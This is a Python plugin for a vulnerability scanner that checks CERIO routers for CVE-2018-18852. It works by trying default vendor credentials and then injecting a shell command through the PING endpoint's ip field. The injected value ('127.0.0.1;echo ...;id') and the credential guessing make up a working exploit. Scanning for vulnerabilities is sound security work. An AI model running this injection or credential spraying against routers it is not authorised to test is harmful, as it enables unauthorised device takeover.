#!/usr/bin/env python
# -*- coding:utf-8 -*-
# Reference: https://github.com/hook-s3c/CVE-2018-18852
# Reference: https://www.secquan.org/BugWarning/1068768

class VulnChecker(VulnCheck):
    def __init__(self, ip_and_port_list):
        self._name = 'cerio_auth_rce'
        self.info = "Check the CERIO router Authenticated RCE (backdoor vendor creds) CVE-2018-18852"
        self.keyword = ['all', 'cerio', 'router', 'rce', 'danger', '80', '443']
        self.default_ports_list = [80, 443]
        VulnCheck.__init__(self, ip_and_port_list)

    def _check(self, ip, port):
        user_list = ['admin', 'root', 'operator'] if len(USER_LIST) == 0 else USER_LIST
        pass_list = ['admin', 'root', 'default', '1234', '123456'] if len(PASS_LIST) == 0 else PASS_LIST
        
        model = 'DT-300N-NGS-M'
        for http_ in ('http', 'https'):
            for user in user_list:
                for pass_ in pass_list:
                    try:
                        b64Val = base64.b64encode("%s:%s"%(user, pass_))
                        url = '%s://%s:%d/cgi-bin/main.cgi?cgi=PING&mode=9'%(http_, ip, port)
                        data = {'cgi':'PING', 'mode':'9'}
                        heads = {'content-type': 'application/json','Host': ip,'Accept-Encoding': 'gzip, deflate', 'Connection' : 'keep-alive','Authorization': 'Basic %s' % b64Val}
                        get_pid = Requester(url, method='post', data=data, header=heads)
                        if get_pid.code == 404:
                            model = 'DT-300N'
                            url = '%s://%s:%d/cgi-bin/Save.cgi?cgi=PING'%(http_, ip, port)
                            get_pid = Requester(url, method='post', data=data, header=heads)

                        if get_pid.code == 200 and check_200_or_404(url):
                            output = json.loads(get_pid.html)
                        else:
                            continue

                        pid = output['pid'] if model is 'DT-300N-NGS-M' else output
                        cmd = "id"
                        data = {'ip': '127.0.0.1;'+'echo "[[[";'+cmd, 'pid': pid, 'Times' : 1} 
                        get_data = Requester(url, method='post', data=data, header=heads, timeout=3*timeout)
                        if "uid=" in get_data.html and "gid=" in get_data.html:
                            result = "exists the CERIO router Authenticated RCE (backdoor vendor creds) CVE-2018-18852, and user: %s, pass: %s"%(user, pass_)
                            self._output(ip, port, result)
                            return
                    except:
                        pass

globals()['VulnChecker'] = VulnChecker
